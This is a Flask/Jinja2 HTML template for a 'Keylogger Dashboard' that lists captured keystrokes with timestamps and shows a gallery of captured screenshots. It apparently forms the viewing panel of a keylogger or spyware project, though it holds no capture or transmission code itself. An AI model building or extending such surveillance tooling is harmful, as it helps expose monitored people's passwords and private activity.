<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Dashboard</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body>
    


    <div class="container mt-4">
        <h2 class="text-center">Keylogger Dashboard</h2>
        
        <h4>Keystroke Logs</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Key</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log[0] }}</td>
                    <td>{{ log[1] }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        
        <h4>Captured Screenshots</h4>
<div class="row">
    {% if screenshots %}
        {% for screenshot in screenshots %}
        <div class="col-md-3">
            <a href="{{ url_for('static', filename='screenshots/' + screenshot) }}" target="_blank">
                <img src="{{ url_for('static', filename='screenshots/' + screenshot) }}" class="img-fluid img-thumbnail" alt="Screenshot">
            </a>
        </div>
        {% endfor %}
    {% else %}
        <p>No screenshots captured yet.</p>
    {% endif %}
</div>

    </div>
</body>
</html>
